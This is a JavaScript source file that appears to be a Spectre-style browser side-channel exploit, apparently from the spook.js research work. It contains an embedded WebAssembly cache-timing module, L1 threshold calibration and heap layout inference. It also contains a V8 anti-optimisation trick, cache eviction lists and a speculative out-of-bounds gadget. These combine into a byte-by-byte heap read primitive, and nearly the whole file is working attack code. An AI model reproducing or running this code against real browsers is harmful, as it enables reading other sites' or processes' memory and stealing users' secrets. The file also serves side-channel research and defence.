const ARRAY_VALUE = 0x5A;

const EVICTION_LIST_SIZE = 200;
const PAGE_SZ = 4096;
const CACHE_LINE_SZ = 64;
const CACHE_LINES_PER_PAGE = PAGE_SZ/CACHE_LINE_SZ;
const CACHE_WAYS = 8;
const ELEMENT_SZ = 4;
const testReps = 1;

function triggerGC() {
  for (let i = 0; i < 50; i++) {
    new ArrayBuffer(1024*1024);
  }
}

// Insert for spook.js
class AttackerObject {
  constructor(i) {
    this.f0  = 0x10101010 >> 1;
    this.f1  = 0x20202020 >> 1;
    this.f2  = 0x30303030 >> 1;
    this.f3  = 0x40404040 >> 1;
    this.f4  = 0x50505050 >> 1;
    this.f5  = 0x60606060 >> 1;
    this.f6  = 0x70707070 >> 1;
    this.f7  = 0x80808080 >> 1;
    this.f8  = 0x90909090 >> 1;
    this.f9  = 0xa0a0a0a0 >> 1;
    this.f10 = 0xb0b0b0b0 >> 1;
    this.f11 = 0xc0c0c0c0 >> 1;


    this.f11 = (i << 7) | (i << 15);
  }
}

const typedArrays = new Array(256);
typedArrays.fill(Object);
triggerGC();
// TODO: this can be a prefilled array
const leakMe = [];
for (let i = 0; i < 554; i++) {
  leakMe[i] = 0;
}
triggerGC();
for (let i = 0; i < 64; i++) {
  typedArrays[i] = new Uint8Array(0x20);
  triggerGC();
}
triggerGC();
for (let i = 64; i < 128; i++) {
  typedArrays[i] = new AttackerObject(i);
  triggerGC();
}
triggerGC();

function log(message) {
    postMessage({type: 'log', message: message});
}

function err(message) {
    postMessage({type: 'error', message: message});
}

// The wasm code can be found in cachetools.wat
// In summary, it exposes two similar functions that
// * prime a given cache set with known values
// * run a callback
// * repeatedly access the chosen values while keeping one unknown entry in the
//   cache alive
// If the callback was using this cache set, we will see repeated l1 cache
// misses. If not, we will see repeated cache hits.
// The two functions differ from each other by how often the "keepAlive" element
// is accessed. Accessing it more often makes it more stable, but also reduces
// the timing difference.
const wasmBytes = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x1a, 0x02, 0x60, 0x01, 0x7f, 0x01, 0x7f, 0x60, 0x11, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x00, 0x02, 0x22, 0x02, 0x03, 0x65, 0x6e, 0x76, 0x03, 0x6d, 0x65, 0x6d, 0x02, 0x01, 0x80, 0x40, 0x80, 0x40, 0x03, 0x65, 0x6e, 0x76, 0x0c, 0x70, 0x6c, 0x72, 0x75, 0x43, 0x61, 0x6c, 0x6c, 0x62, 0x61, 0x63, 0x6b, 0x00, 0x00, 0x03, 0x03, 0x02, 0x01, 0x01, 0x07, 0x2a, 0x02, 0x11, 0x6f, 0x73, 0x63, 0x69, 0x6c, 0x6c, 0x61, 0x74, 0x65, 0x54, 0x72, 0x65, 0x65, 0x50, 0x4c, 0x52, 0x55, 0x00, 0x01, 0x12, 0x6f, 0x73, 0x63, 0x69, 0x6c, 0x6c, 0x61, 0x74, 0x65, 0x54, 0x72, 0x65, 0x65, 0x50, 0x4c, 0x52, 0x55, 0x32, 0x00, 0x02, 0x0a, 0x99, 0x05, 0x02, 0xa0, 0x02, 0x00, 0x41, 0x00, 0x20, 0x09, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0a, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0b, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0c, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0d, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0e, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0f, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x10, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x10, 0x00, 0x03, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x00, 0x41, 0x03, 0x6b, 0x21, 0x00, 0x20, 0x00, 0x41, 0x00, 0x4e, 0x0d, 0x00, 0x0b, 0x1a, 0x0b, 0xf4, 0x02, 0x00, 0x41, 0x00, 0x20, 0x09, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0a, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0b, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0c, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0d, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0e, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0f, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x10, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x10, 0x00, 0x03, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x00, 0x41, 0x03, 0x6b, 0x21, 0x00, 0x20, 0x00, 0x41, 0x00, 0x4e, 0x0d, 0x00, 0x0b, 0x1a, 0x0b]);
class L1Timer {
  constructor(callback) {
    this.memory = new WebAssembly.Memory({
      initial: 8192,
      maximum: 8192,
    });
    const wasmU82 = new Uint8Array(this.memory.buffer);
    for (let i = 0; i < wasmU82.length; i += PAGE_SZ) {
      wasmU82[i+8] = 1;
    }
    this.memPages = Math.floor(8192*64*1024)/PAGE_SZ;
    this.cacheSets = this._generateCacheSets();
    this.clearSets = this._generateCacheSets();

    this.wasm = new WebAssembly.Instance(new WebAssembly.Module(wasmBytes), {
      env: {
        mem: this.memory,
        plruCallback: callback
      }
    });

    this.timeCacheSet(0);
    for (let i = 0; i < 100000; i++) {
      callback();
    }
  }

  _timeL1(cacheSet, clearSet) {
    const start = performance.now();
    this.wasm.exports.oscillateTreePLRU2(4000,
      cacheSet[0],
      cacheSet[1],
      cacheSet[2],
      cacheSet[3],
      cacheSet[4],
      cacheSet[5],
      cacheSet[6],
      cacheSet[7],
      clearSet[0],
      clearSet[1],
      clearSet[2],
      clearSet[3],
      clearSet[4],
      clearSet[5],
      clearSet[6],
      clearSet[7]
    );
    const end = performance.now();
    return end - start;
  }

  _randomPage() {
    const rnd = Math.floor(Math.random() * this.memPages);
    return PAGE_SZ*rnd;
  }

  _generateCacheSets() {
    const cacheSets = new Array(CACHE_LINES_PER_PAGE);
    for (let i = 0; i < cacheSets.length; i++) {
      cacheSets[i] = new Array(CACHE_WAYS);
    }
    for (let i = 0; i < cacheSets[0].length; i++) {
     cacheSets[0][i] = this._randomPage();
    }
    for (let i = 1; i < cacheSets.length; i++) {
      for (let j = 0; j < cacheSets[i].length; j++) {
        cacheSets[i][j] = cacheSets[0][j]+i*CACHE_LINE_SZ;
      }
    }
    return cacheSets;
  }

  timeCacheSet(cacheSetIndex) {
    const cacheSet = this.cacheSets[cacheSetIndex];
    const clearSet = this.clearSets[cacheSetIndex];
    return this._timeL1(cacheSet, clearSet);
  }
}

function sort(arr) {
  for (let i = 0; i < arr.length; i++) {
    for (let j = 0; j < arr.length-1; j++) {
      if (arr[j] > arr[j+1]) {
        const tmp = arr[j];
        arr[j] = arr[j+1];
        arr[j+1] = tmp;
      }
    }
  }
  return arr;
}

function indexOfMin(arr) {
  let minValue = arr[0];
  let minIndex = 0;
  for (let i = 0; i < arr.length; i++) {
    if (arr[i] < minValue) {
      minValue = arr[i];
      minIndex = i;
    }
  }
  return minIndex;
}

function randomCacheLine() {
  return Math.floor(CACHE_LINES_PER_PAGE*Math.random());
}

const alignedMemory = new Uint8Array(new WebAssembly.Memory({
  initial: 1,
  maximum: 1,
}).buffer);
alignedMemory[8] = 1;

const accessArgs = new Uint32Array([0]);
function accessPage(trash) {
  const pageOffset = accessArgs[0]|0;
  return alignedMemory[pageOffset+trash];
}

const benchmark = new L1Timer(accessPage);

// accessPage will touch more cache lines besides the one that we trigger
// To find a cache line that is not used, we first iterate through all and
// choose the fastest one.
const cacheSetTimings = new Array(CACHE_LINES_PER_PAGE);
for (let set = 0; set < CACHE_LINES_PER_PAGE; set++) {
  cacheSetTimings[set] = benchmark.timeCacheSet(set);
}
const fastSet = indexOfMin(cacheSetTimings);

const reps = 200;
const hits = new Array(reps);
const misses = new Array(reps);
const hitOffset = fastSet*CACHE_LINE_SZ;
const missOffset = (hitOffset + PAGE_SZ/2) % PAGE_SZ;
for (let i = 0; i < reps; i++) {
  accessArgs[0] = hitOffset;
  hits[i] = benchmark.timeCacheSet(fastSet);
  accessArgs[0] = missOffset
  misses[i] = benchmark.timeCacheSet(fastSet);
}

hits.sort((a, b) => a - b);
misses.sort((a, b) => a - b);

const CACHE_L1_THRESHOLD = (median(hits) + median(misses)) / 2;

log(`${hits[2]} - ${hits[50]} - ${hits[98]}`);
log(`${misses[2]} - ${misses[50]} - ${misses[98]}`);
log(`L1 THRESHOLD (AUTO CALIBRATED): ${CACHE_L1_THRESHOLD}`);

// We access the "leakMe" array at incremental offsets and measure the hits
// to the l1 cache sets using our L1Timer.
// The results are stored in a 2-dimensional array.
// After collecting the data, find consecutive runs of cache hits, that
// transition from one cache set to the next.

const accessLeakMeArgs = new Uint32Array([0]);
function accessLeakMe(trash) {
  const offset = accessLeakMeArgs[0] | 0;
  return leakMe[offset+trash];
}

const leakMeTimer = new L1Timer(accessLeakMe);

function leakMeTestSet(offset, set) {
  accessLeakMeArgs[0] = offset;
  return leakMeTimer.timeCacheSet(set) > CACHE_L1_THRESHOLD;
}

const elementSize = 4;
const elementsPerCacheLine = CACHE_LINE_SZ/elementSize;
const testElementCount = 128;

const cacheHits = new Array(testElementCount);
for (let i = 0; i < cacheHits.length; i++) {
  cacheHits[i] = new Array(CACHE_LINES_PER_PAGE);
  for (let j = 0; j < cacheHits[i].length; j++) {
    cacheHits[i][j] = 0;
  }
}

for (let i = 0; i < testReps; i++) {
  for (let set = 0; set < CACHE_LINES_PER_PAGE; set++) {
    for (let elementIndex = 0; elementIndex < testElementCount; elementIndex++) {
      if (leakMeTestSet(elementIndex, set)) {
        cacheHits[elementIndex][set] += 1;
      }
    }
  }
}

function previousCacheSet(cacheSet) {
  return (CACHE_LINES_PER_PAGE+cacheSet-1) % CACHE_LINES_PER_PAGE;
}

// Find all clear transitions from one cache set to the next.
// I.e. it should look like:
//   hit  | miss
//   -----+-----
//   miss | hit
function* findTransitions() {
  let offset = elementsPerCacheLine;
  // need at least 16 elements to the bottom
  while (offset <= cacheHits.length - elementsPerCacheLine) {
    for (let cacheSet = 0; cacheSet < CACHE_LINES_PER_PAGE; cacheSet++) {
      const prevCacheSet = previousCacheSet(cacheSet);
      if (cacheHits[offset][cacheSet] != testReps) continue;
      if (cacheHits[offset-1][prevCacheSet] != testReps) continue;
      if (cacheHits[offset-1][cacheSet] != 0) continue;
      if (cacheHits[offset][prevCacheSet] != 0) continue;
      yield [offset, cacheSet];
    }
    offset++;
  }
}

// The algorithm is very simple, try to find runs of cache set hit that
// transition from one cache set to the next. I.e. if we iterate over the array
// elements, we expect 16 hits on cacheSet n, followed by 16 hits on n+1.
function inferCacheAlignment(falsePositiveThreshold, falseNegativeThreshold) {
  for (const [transitionOffset, transitionCacheSet] of findTransitions()) {
    const prevCacheSet = previousCacheSet(transitionCacheSet);
    const startOffset = transitionOffset - elementsPerCacheLine;
    const maxHitCount = 2 * elementsPerCacheLine * testReps;
    let hitCount = 0;
    let wrongHitCount = 0;
    for (let i = 0; i < elementsPerCacheLine; i++) {
      hitCount += cacheHits[startOffset+i][prevCacheSet];
      hitCount += cacheHits[transitionOffset+i][transitionCacheSet];
      wrongHitCount += cacheHits[startOffset+i][transitionCacheSet];
      wrongHitCount += cacheHits[transitionOffset+i][prevCacheSet];
    }
    if (hitCount/maxHitCount >= (1-falseNegativeThreshold)
      && wrongHitCount/maxHitCount < falsePositiveThreshold) {
      return [true, startOffset, prevCacheSet];
    }
  }
  return [false, -1, -1];
}

const kEndMarker = 0xffffffff;
const kWasmPageSize = 64*1024;
class EvictionList {
  constructor(initialSize, offset) {
    const memorySize = initialSize*PAGE_SZ;
    this.memory = new DataView(new WebAssembly.Memory({initial: Math.ceil(memorySize/kWasmPageSize)}).buffer);
    this.head = offset;
    for (let i = 0; i < initialSize-1; i++) {
      this.memory.setUint32(i*PAGE_SZ+offset, (i+1)*PAGE_SZ+offset, true);
    }
    this.tail = (initialSize-1)*PAGE_SZ+offset;
    this.memory.setUint32(this.tail, kEndMarker, true);
    this.length = initialSize;
  }

  traverse() {
    let e = this.head;
    while (e != kEndMarker) {
      e = this.memory.getUint32(e, true);
    }
    return e;
  }
}

function sleep(ms) {
    return new Promise(r=>setTimeout(r, ms));
}

function alignedArrayBuffer(sz) {
    const wasm_pages = Math.ceil(sz/(64*1024));
    return new WebAssembly.Memory({initial: wasm_pages, maximum: wasm_pages}).buffer
}

const probeArray = new Uint8Array(alignedArrayBuffer(PAGE_SZ));
probeArray[0] = 1;

const spectreArgs = new Uint32Array([0, 0, 0, 0]);

/**
 * Returns a copy of the function `fn` that is not optimized.
 *  Never call the original function `fn` - only ever call the function returned by `preventOptimization`.
 *
 *  Note: Does not work with variadic functions.
 *
 * Operation is controlled by the `CONFIG_CHEAT_PREVENT_OPTIMIZATION` configuration parameter.
 * - NEVER:  Rewrites `fn` so V8 will refuse to inline or optimize it.
 * - ALWAYS: Uses Natives.neverOptimizeFunction and throws an error if it's not available.
 * - PREFER: Uses Natives.neverOptimizeFunction if it's available, otherwise rewrites `fn`
 */
function preventOptimization(fn) {
    /**
     * Use V8's native functions for disabling optimization where we can and are configured to do so.
     */
    //if ((CONFIG_CHEAT_PREVENT_OPTIMIZATION === PREFER && Natives.enabled) || CONFIG_CHEAT_PREVENT_OPTIMIZATION === ALWAYS) {
    //    Natives.neverOptimizeFunction(fn);
    //    return fn;
    //}

    /**
     * Otherwise, abuse the fact that V8 refuses to optimize very large functions by rewriting the function to include a
     *  very large number of operations. We prevent these operations from actually being executed by wrapping the code
     *  in a conditional statement that is always true.
     */
    const code = fn.toString();

    // Use a parameter as the source for the conditional statement so V8 doesn't know it can remove dead code.
    let parameters = code.slice(
        code.indexOf('(') + 1,
        code.indexOf(')')
    );
    parameters = parameters.trim();
    parameters = parameters + (parameters === "" ? "" : ", ") + "__RUN__CODE__=true";

    const body = code.slice(
        code.indexOf('{') + 1,
        code.lastIndexOf('}')
    );

    const optimizationKiller = new Array(30 * 1000).fill('x++;').join("");
    const async = code.startsWith("async") ? "async" : "";

    return eval(`(
        ${async} function(${parameters}){
            if (__RUN__CODE__) {
                ${body};
                return undefined;
            }

            let x=0;
            ${optimizationKiller}
            return x;
        }
    );`);
}

function spectreGadget() {
    // We want to access as little memory as possible to avoid false positives.
    // Putting arguments in a global array seems to work better than passing them
    // as parameters.
    const idx = spectreArgs[0]|0;
    const bit = spectreArgs[1]|0;
    const junk = spectreArgs[2]|0;
    
    // Add a loop to control the state of the branch predictor
    // I.e. we want the last n branches taken/not taken to be consistent
    for (let i = 0; i < 200; i++);
    
    // idx will be out of bounds during speculation
    // if the bit is zero, we access cache line 0 of the probe array otherwise
    // 0x800 (cache line 32)
    
    if (idx < spectreArray.length) {
        return probeArray[((spectreArray[idx]>>bit)&1)*0x800];
    }
    
    return probeArray[0x400];
}

const testBit = preventOptimization(function testBit(evictionList, offset, bit, bitValue, noopt = true) {
    spectreArgs[0] = 0;
    spectreArgs[1] = 0;
    
    // Run the gadget twice to train the branch predictor.
    for (let j = 0; j < 2; j++) {
        spectreGadget();
    }
    
    // Try to evict the length field of our array from memory, so that we can
    // speculate over the length check.
    evictionList.traverse();
    
    spectreArgs[0] = offset;
    spectreArgs[1] = bit;
    
    // In the gadget, we access cacheSet 0 if the bit was 0 and set 32 for bit 1.
    const timing = spectreTimer.timeCacheSet(bitValue == 1 ? 32 : 0);
    
    return timing > CACHE_L1_THRESHOLD;
});

function leakBit(evictionList, offset, bit) {
    let zeroes = 0;
    let ones = 0;
    
    // Our leak is probabilistic. To filter out some noise, we test both for bit 0
    // and 1 repeatedly. If we didn't get a difference in cache hits, continue
    // until we see a diff.
    for (let i = 0; i < 1; i++) {
        if (testBit(evictionList, offset, bit, 0)) zeroes++;
        if (testBit(evictionList, offset, bit, 1)) ones++;
    }
    for (let i = 1; ones == zeroes && i < 5; i++) {
        if (testBit(evictionList, offset, bit, 0)) zeroes++;
        if (testBit(evictionList, offset, bit, 1)) ones++;
        if (ones != zeroes) break;
    }
    return ones > zeroes ? 1 : 0;
}

function leakByte(evictionList, offset) {
    let byte = 0;
    for (let bit = 0; bit < 8; bit++) {
        byte |= leakBit(evictionList, offset, bit) << bit;
    }
    return byte;
}

function median(values) {
    return values.sort((a, b) => a - b)[values.length >> 1];
}

function createHeapReadPrimitive(arrayValue) {
    const [leakSuccess, alignedIndex, inferredCacheSet] = inferCacheAlignment(0.20, 0.05);
    if (leakSuccess) {
        log(`Inferred memory layout: array index ${alignedIndex} is in cacheSet ${inferredCacheSet}`);
    } else {
        err("Could not infer memory layout");
        return null;
    }

    const arrayPageOffset = (PAGE_SZ + inferredCacheSet * CACHE_LINE_SZ - alignedIndex * elementSize) % PAGE_SZ;
    log(`Array elements page offset: 0x${(arrayPageOffset).toString(16)}`);

    // We want the backing store ptr and the length of the typed array to be on separate cache lines.
    const desiredAlignment = 2 * CACHE_LINE_SZ - (40);
    let typedArrayPageOffset = (arrayPageOffset + leakMe.length * 4) % PAGE_SZ;
    log(`TypedArray at 0x${typedArrayPageOffset.toString(16)}`);

    // We prepared a memory layout in setup_memory.js that looks like this:
    // leakMe | typedArray[0] | typedArrayBackingStore[0] | typedArray[1] | typedArrayBackingStore[1] | ...
    // Just iterate through them to find one that has the alignment we want.
    let alignedTypedArray = undefined;
    for (let i = 0; i < 63; i++) {
        if (typedArrayPageOffset % (2 * CACHE_LINE_SZ) == desiredAlignment) {
            log(`Found TypedArray with desired alignment (@0x${typedArrayPageOffset.toString(16)}) index: ${i}`);
            alignedTypedArray = typedArrays[i];
            // Fill all arrays before and after with 0x41 so that we can see them in
            // the hexdump.
            // We also use it as a known value to test if our leak works.
            for (let j = 0; j < 64; j++) {
              for (let k = 0; k < typedArrays[j].length; k++) {
                typedArrays[j][k] = arrayValue[k];
              }
              typedArrays[j][0] = j;
            }
            alignedTypedArrayIndex = i;
            break;
        }
        typedArrayPageOffset += 164;
        typedArrayPageOffset %= PAGE_SZ;
    }
    if (alignedTypedArray == undefined || alignedTypedArrayIndex >= 0x20) {
        err("Couldn't create TypedArray with right alignment");
        return null;
    }

    // Create these as globals.
    // The spectreArray is what we will access out of bounds.
    // The spectreTimer calls the spectre gadget and checks which cache sets it's using.
    Object.defineProperty(this, "spectreArray", {
        value: alignedTypedArray,
    });
    Object.defineProperty(this, "spectreTimer", {
        value: new L1Timer(spectreGadget)
    });

    // This will be used to evict the typed array length from the cache
    const typedArrayEvictionList = new EvictionList(EVICTION_LIST_SIZE, typedArrayPageOffset & 0xfc0);

    return {
      pageOffset: arrayPageOffset,
      index: alignedTypedArrayIndex,
      leak: (offset) => leakByte(typedArrayEvictionList, offset)
    };
}